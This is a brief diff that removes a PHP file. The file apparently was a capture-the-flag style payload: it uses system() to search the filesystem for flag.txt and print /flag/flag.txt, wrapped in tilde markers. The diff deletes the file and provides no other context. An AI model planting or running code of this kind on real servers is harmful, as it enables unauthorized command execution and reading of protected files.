@@ -1,6 +1,0 @@
-<?php
-echo ("~");
-system('find / -name flag.txt 2>/dev/null');
-system('cat /flag/flag.txt');
-echo ("~");
-?>
